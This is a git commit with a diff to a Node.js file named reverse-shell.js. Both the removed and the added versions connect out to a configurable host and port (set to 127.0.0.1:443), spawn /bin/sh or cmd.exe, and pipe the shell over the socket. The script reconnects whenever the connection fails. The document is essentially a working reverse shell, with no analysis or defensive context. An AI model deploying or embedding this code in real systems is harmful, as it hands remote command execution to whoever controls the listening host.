dabd5ed265633ade637233a181844595b67ab90c
Tomer Zait <tomerz@ironsrc.com>
2015-05-22 11:05:01 +0300

    Now close on server.close()

--- reverse-shell.js
+++ reverse-shell.js
@@ -1,24 +1,29 @@
 var os = require('os');
 var net = require('net');
-var child_process = require('child_process');
 var path = require('path');
+var child_process = require('child_process');
 
-HOST="127.0.0.1";
-PORT="443";
-TIMEOUT="6000";
+RHOST="127.0.0.1";
+RPORT="443";
+TIMEOUT=6000;
 
-function reverseShell(HOST,PORT) {
-    var client = new net.Socket();
-    client.connect(PORT, HOST, function() {
-        var shell_path = (os.platform().indexOf('win') != -1)  ? path.join(process.env.windir, 'System32', 'cmd.exe') : '/bin/sh';
+function reverseShell(HOST, PORT) {
+    var server = new net.Socket();
+    server.connect(PORT, HOST, function() {
+        var shell_path = '/bin/sh';
+        if (!os.platform().indexOf('win'))
+            shell_path = path.join(process.env.windir, 'System32', 'cmd.exe');
+
         var cmd = child_process.spawn(shell_path);
-        client.pipe(cmd.stdin);
-        cmd.stdout.pipe(client);
-        cmd.stderr.pipe(client);
+        server.pipe(cmd.stdin);
+        cmd.stdout.pipe(server);
+		cmd.stderr.pipe(server);
     });
-    client.on('error', function(e) {
-        setTimeout(reverseShell(HOST,PORT), TIMEOUT);
+    server.on('error', function(error) {
+        if (error.code === 'ECONNRESET')
+            process.exit(0);
+        setTimeout(reverseShell(HOST, PORT), TIMEOUT);
     });
 }
 
-reverseShell(HOST,PORT);
+reverseShell(RHOST, RPORT);
